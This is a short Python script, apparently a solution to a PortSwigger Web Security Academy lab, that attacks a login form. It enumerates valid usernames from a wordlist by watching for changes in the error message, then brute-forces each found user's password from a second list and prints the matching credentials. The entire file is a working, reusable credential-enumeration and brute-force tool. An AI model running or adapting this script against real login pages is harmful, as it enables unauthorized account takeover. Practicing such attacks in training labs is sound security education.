import requests as req 

url = "https://0af600d803a397c5c060131400410060.web-security-academy.net/login"
password = "jackass"

user_file = open("../usernames")

while user := user_file.readline().strip():
    dat = {"username":user,"password":password}
    x = req.post(url, dat)
    if "Invalid username" not in x.text:
        print(f"Found valid username {user}")
        pass_file = open("../passwords")
        while passw := pass_file.readline().strip():
            dat = {"username":user,"password":passw}
            y = req.post(url, dat)
            if "Incorrect password" not in y.text:
                print(f"Username: {user}\nPassword: {passw}\n\n")